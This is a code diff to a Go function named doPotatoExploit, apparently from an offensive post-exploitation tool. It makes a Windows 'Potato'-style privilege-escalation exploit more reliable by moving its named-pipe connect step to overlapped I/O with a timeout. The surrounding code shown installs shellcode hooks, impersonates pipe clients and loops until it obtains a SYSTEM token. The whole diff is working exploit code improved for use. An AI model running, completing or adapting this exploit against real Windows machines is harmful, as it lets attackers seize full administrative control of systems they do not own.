@@ -460,8 +460,8 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)
 	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
 		uintptr(unsafe.Pointer(pipeNamePtr)),
-		PIPE_ACCESS_DUPLEX, // No FILE_FLAG_OVERLAPPED — synchronous pipe
-		0,                  // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT = 0x00
+		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
+		0, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT = 0x00
 		PIPE_UNLIMITED_INSTANCES,
 		PIPE_BUFFER_SIZE,
 		PIPE_BUFFER_SIZE,
@@ -478,20 +478,13 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	pipeHandle := windows.Handle(hPipe)
 	defer windows.CloseHandle(pipeHandle)
 
-	// Start synchronous ConnectNamedPipe in a goroutine (matches GodPotato/RustPotato).
-	// The goroutine blocks until a client connects or the pipe handle is closed.
-	pipeConnected := make(chan bool, 1)
-	go func() {
-		ret, _, err := procConnectNamedPipe.Call(hPipe, 0)
-		connected := ret != 0
-		if !connected {
-			// ERROR_PIPE_CONNECTED (535) means client connected before ConnectNamedPipe
-			if errno, ok := err.(syscall.Errno); ok && errno == 535 {
-				connected = true
-			}
-		}
-		pipeConnected <- connected
-	}()
+	// Start overlapped ConnectNamedPipe (safe to cancel via CancelIo or handle close)
+	pipeEvent, _ := windows.CreateEvent(nil, 1, 0, nil)
+	defer windows.CloseHandle(pipeEvent)
+
+	var overlapped windows.Overlapped
+	overlapped.HEvent = pipeEvent
+	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
 
 	// Phase 5: Build native shellcode hook and install it.
 	// We use raw x64 shellcode instead of syscall.NewCallback because Go's callback
@@ -566,10 +559,11 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	// Phase 7-8: Accept pipe connections and look for SYSTEM.
 	// Our own process's COM runtime may connect first (NETWORK SERVICE),
 	// so we loop: accept → check identity → if not SYSTEM, disconnect and retry.
+	// Uses overlapped I/O for safe cancellation (closing handle while synchronous
+	// ConnectNamedPipe blocks can crash on Windows 11 24H2).
 	atomic.StoreInt32(phase, 7)
 
 	systemSID, _ := windows.StringToSid("S-1-5-18") // NT AUTHORITY\SYSTEM
-	deadline := time.After(15 * time.Second)
 	var dupToken windows.Token
 	var clientIdentity string
 	gotSystem := false
@@ -579,35 +573,16 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	for attempts < maxAttempts && !gotSystem {
 		attempts++
 
-		// Wait for a connection (synchronous ConnectNamedPipe in goroutine)
-		pipeOk := false
-		if attempts == 1 {
-			// First attempt: use the goroutine already started in Phase 4
-			select {
-			case pipeOk = <-pipeConnected:
-			case <-deadline:
-			}
-		} else {
-			// Subsequent attempts: start a new ConnectNamedPipe
-			ch := make(chan bool, 1)
-			go func() {
-				ret, _, cErr := procConnectNamedPipe.Call(hPipe, 0)
-				connected := ret != 0
-				if !connected {
-					if errno, ok := cErr.(syscall.Errno); ok && errno == 535 {
-						connected = true
-					}
-				}
-				ch <- connected
-			}()
-			select {
-			case pipeOk = <-ch:
-			case <-deadline:
-			}
+		if attempts > 1 {
+			// Reset event and start new overlapped ConnectNamedPipe
+			windows.ResetEvent(pipeEvent)
+			procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
 		}
 
-		if !pipeOk {
-			break
+		// Wait for connection with timeout
+		waitResult, _ := windows.WaitForSingleObject(pipeEvent, 10000)
+		if waitResult != windows.WAIT_OBJECT_0 {
+			break // timeout, no more connections
 		}
 
 		// Impersonate and check identity
